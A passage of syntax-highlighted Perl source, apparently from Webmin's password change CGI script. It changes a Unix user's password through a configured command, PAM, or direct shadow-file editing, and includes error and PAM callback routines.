    <span class="token variable">&amp;acl::modify_user</span><span class="token punctuation">(</span><span class="token variable">$wuser</span><span class="token operator">-></span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$wuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;reload_miniserv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$gconfig</span><span class="token punctuation">{</span><span class="token string">'passwd_cmd'</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Use some configured command</span>
    <span class="token variable">$passwd_cmd</span> <span class="token operator">=</span> <span class="token variable">&amp;has_command</span><span class="token punctuation">(</span><span class="token variable">$gconfig</span><span class="token punctuation">{</span><span class="token string">'passwd_cmd'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$passwd_cmd</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token string">"The password change command &lt;tt>$gconfig{'passwd_cmd'}&lt;/tt> was not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"proc"</span><span class="token punctuation">,</span> <span class="token string">"proc-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;clean_environment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ENV</span><span class="token punctuation">{</span><span class="token string">'REMOTE_USER'</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># some programs need this</span>
    <span class="token variable">$passwd_cmd</span> <span class="token operator">.=</span> <span class="token string">" "</span><span class="token operator">.</span>quotemeta<span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$fpid</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">&amp;proc::pty_process_exec</span><span class="token punctuation">(</span><span class="token variable">$passwd_cmd</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;reset_environment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">local</span> <span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token variable">&amp;wait_for</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span>
               <span class="token string">'(new|re-enter).*:'</span><span class="token punctuation">,</span>
               <span class="token string">'(old|current|login).*:'</span><span class="token punctuation">,</span>
               <span class="token string">'pick a password'</span><span class="token punctuation">,</span>
               <span class="token string">'too\s+many\s+failures'</span><span class="token punctuation">,</span>
               <span class="token string">'attributes\s+changed\s+on|successfully\s+changed'</span><span class="token punctuation">,</span>
               <span class="token string">'pick your passwords'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token variable">$wait_for_input</span><span class="token punctuation">;</span>
        sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># Prompt for the new password</span>
            syswrite<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token operator">.</span><span class="token string">"\n"</span><span class="token punctuation">,</span> length<span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># Prompt for the old password</span>
            syswrite<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token operator">.</span><span class="token string">"\n"</span><span class="token punctuation">,</span> length<span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># Request for a menu option (SCO?)</span>
            syswrite<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"1\n"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># Failed too many times</span>
            <span class="token keyword">last</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># All done</span>
            <span class="token keyword">last</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true"># Request for a menu option (HP/UX)</span>
            syswrite<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"p\n"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">last</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">last</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span><span class="token variable">$count</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token variable">$crv</span> <span class="token operator">=</span> close<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    waitpid<span class="token punctuation">(</span><span class="token variable">$fpid</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$?</span> <span class="token operator">||</span> <span class="token variable">$count</span> <span class="token operator">></span> <span class="token number">10</span> <span class="token operator">||</span>
        <span class="token variable">$out</span> <span class="token operator">=~</span> <span class="token regex">/error|failed/i</span> <span class="token operator">||</span> <span class="token variable">$out</span> <span class="token operator">=~</span> <span class="token regex">/bad\s+password/i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token string">"&lt;tt>"</span><span class="token operator">.</span><span class="token variable">&amp;html_escape</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string">"&lt;/tt>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'pam'</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Use PAM to make the change..</span>
    <span class="token keyword">eval</span> <span class="token string">"use Authen::PAM;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$@</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">&amp;text</span><span class="token punctuation">(</span><span class="token string">'password_emodpam'</span><span class="token punctuation">,</span> <span class="token variable">$@</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true"># Check if the old password is correct</span>
    <span class="token variable">$service</span> <span class="token operator">=</span> <span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'pam'</span><span class="token punctuation">}</span> <span class="token operator">?</span> <span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'pam'</span><span class="token punctuation">}</span> <span class="token punctuation">:</span> <span class="token string">"webmin"</span><span class="token punctuation">;</span>
    <span class="token variable">$pamh</span> <span class="token operator">=</span> new Authen<span class="token punctuation">:</span><span class="token punctuation">:</span>PAM<span class="token punctuation">(</span><span class="token variable">$service</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token operator">\</span><span class="token variable">&amp;pam_check_func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token variable">$pamh</span><span class="token operator">-></span>pam_authenticate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rv</span> <span class="token operator">==</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_eold'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pamh</span> <span class="token operator">=</span> <span class="token keyword">undef</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true"># Change the password with PAM, in a sub-process. This is needed because</span>
    <span class="token comment" spellcheck="true"># the UID must be changed to properly signal to the PAM libraries that</span>
    <span class="token comment" spellcheck="true"># the password change is not being done by the root user.</span>
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">&amp;transname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pid</span> <span class="token operator">=</span> fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">@uinfo</span> <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span><span class="token variable">$></span><span class="token punctuation">,</span> <span class="token variable">$&lt;</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$uinfo</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$pamh</span> <span class="token operator">=</span> new Authen<span class="token punctuation">:</span><span class="token punctuation">:</span>PAM<span class="token punctuation">(</span><span class="token string">"passwd"</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token operator">\</span><span class="token variable">&amp;pam_change_func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token variable">$pamh</span><span class="token operator">-></span>pam_chauthtok<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        open<span class="token punctuation">(</span>TEMP<span class="token punctuation">,</span> <span class="token string">">$temp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> TEMP <span class="token string">"$rv\n"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> TEMP <span class="token punctuation">(</span><span class="token variable">$messages</span> <span class="token operator">||</span> <span class="token variable">$pamh</span><span class="token operator">-></span>pam_strerror<span class="token punctuation">(</span><span class="token variable">$rv</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
        close<span class="token punctuation">(</span>TEMP<span class="token punctuation">)</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    waitpid<span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    open<span class="token punctuation">(</span>TEMP<span class="token punctuation">,</span> <span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chop<span class="token punctuation">(</span><span class="token variable">$rv</span> <span class="token operator">=</span> <span class="token filehandle symbol">&lt;TEMP></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    chop<span class="token punctuation">(</span><span class="token variable">$messages</span> <span class="token operator">=</span> <span class="token filehandle symbol">&lt;TEMP></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    close<span class="token punctuation">(</span>TEMP<span class="token punctuation">)</span><span class="token punctuation">;</span>
    unlink<span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rv</span> <span class="token operator">==</span> PAM_SUCCESS <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">&amp;text</span><span class="token punctuation">(</span><span class="token string">'password_epam'</span><span class="token punctuation">,</span> <span class="token variable">$messages</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pamh</span> <span class="token operator">=</span> <span class="token keyword">undef</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true"># Directly update password file</span>

    <span class="token comment" spellcheck="true"># Read shadow file and find user</span>
    <span class="token variable">&amp;lock_file</span><span class="token punctuation">(</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_file'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$lref</span> <span class="token operator">=</span> <span class="token variable">&amp;read_file_lines</span><span class="token punctuation">(</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_file'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">@$lref</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">@line</span> <span class="token operator">=</span> split<span class="token punctuation">(</span><span class="token regex">/:/</span><span class="token punctuation">,</span> <span class="token variable">$lref</span><span class="token operator">-></span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">local</span> <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token variable">$line</span><span class="token punctuation">[</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_uindex'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$u</span> <span class="token operator">eq</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$idx</span> <span class="token operator">=</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
            <span class="token keyword">last</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    defined<span class="token punctuation">(</span><span class="token variable">$idx</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_euser'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true"># Validate old password</span>
    <span class="token variable">&amp;unix_crypt</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$line</span><span class="token punctuation">[</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_pindex'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">eq</span>
        <span class="token variable">$line</span><span class="token punctuation">[</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_pindex'</span><span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">||</span>
            <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_eold'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true"># Make sure new password meets restrictions</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"changepass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"changepass"</span><span class="token punctuation">,</span> <span class="token string">"changepass-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$err</span> <span class="token operator">=</span> <span class="token variable">&amp;changepass::check_password</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"useradmin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"useradmin"</span><span class="token punctuation">,</span> <span class="token string">"user-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$err</span> <span class="token operator">=</span> <span class="token variable">&amp;useradmin::check_password_restrictions</span><span class="token punctuation">(</span>
                <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">&amp;pass_error</span><span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$err</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true"># Set new password and save file</span>
    <span class="token variable">$salt</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">.</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$line</span><span class="token punctuation">[</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_pindex'</span><span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">&amp;unix_crypt</span><span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$days</span> <span class="token operator">=</span> int<span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token variable">*60</span><span class="token variable">*60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$line</span><span class="token punctuation">[</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_cindex'</span><span class="token punctuation">}</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$days</span><span class="token punctuation">;</span>
    <span class="token variable">$lref</span><span class="token operator">-></span><span class="token punctuation">[</span><span class="token variable">$idx</span><span class="token punctuation">]</span> <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token variable">@line</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;flush_file_lines</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;unlock_file</span><span class="token punctuation">(</span><span class="token variable">$miniserv</span><span class="token punctuation">{</span><span class="token string">'passwd_file'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment" spellcheck="true"># Change password in Usermin too</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">&amp;get_product_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">'usermin'</span> <span class="token operator">&amp;&amp;</span>
    <span class="token variable">&amp;foreign_check</span><span class="token punctuation">(</span><span class="token string">"changepass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">&amp;foreign_require</span><span class="token punctuation">(</span><span class="token string">"changepass"</span><span class="token punctuation">,</span> <span class="token string">"changepass-lib.pl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;changepass::change_mailbox_passwords</span><span class="token punctuation">(</span>
        <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">&amp;changepass::change_samba_password</span><span class="token punctuation">(</span>
        <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'new1'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


<span class="token variable">&amp;header</span><span class="token punctuation">(</span><span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token string">"&lt;center>&lt;h3>"</span><span class="token punctuation">,</span><span class="token variable">&amp;text</span><span class="token punctuation">(</span><span class="token string">'password_done'</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;/h3>&lt;/center>\n"</span><span class="token punctuation">;</span>

<span class="token variable">&amp;footer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function"><span class="token keyword">sub</span> pass_error</span>
<span class="token punctuation">{</span>
<span class="token variable">&amp;header</span><span class="token punctuation">(</span><span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token keyword">undef</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token variable">&amp;ui_hr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token string">"&lt;center>&lt;h3>"</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">{</span><span class="token string">'password_err'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">" : "</span><span class="token punctuation">,</span><span class="token variable">@_</span><span class="token punctuation">,</span><span class="token string">"&lt;/h3>&lt;/center>\n"</span><span class="token punctuation">;</span>

<span class="token keyword">print</span> <span class="token variable">&amp;ui_hr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">&amp;footer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function"><span class="token keyword">sub</span> pam_check_func</span>
<span class="token punctuation">{</span>
<span class="token keyword">my</span> <span class="token variable">@res</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">@_</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">my</span> <span class="token variable">$code</span> <span class="token operator">=</span> shift<span class="token punctuation">;</span>
    <span class="token keyword">my</span> <span class="token variable">$msg</span> <span class="token operator">=</span> shift<span class="token punctuation">;</span>
    <span class="token keyword">my</span> <span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>

    <span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> PAM_PROMPT_ECHO_ON<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ans</span> <span class="token operator">=</span> <span class="token variable">$in</span><span class="token punctuation">{</span><span class="token string">'old'</span><span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$code</span> <span class="token operator">==</span> PAM_PROMPT_ECHO_OFF<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    push <span class="token variable">@res</span><span class="token punctuation">,</span> <span class="token variable">$ans</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
push <span class="token variable">@res</span><span class="token punctuation">,</span> PAM_SUCCESS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
return <span class="token variable">@res</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function"><span class="token keyword">sub</span> pam_change_func</span>
<span class="token punctuation">{</span>
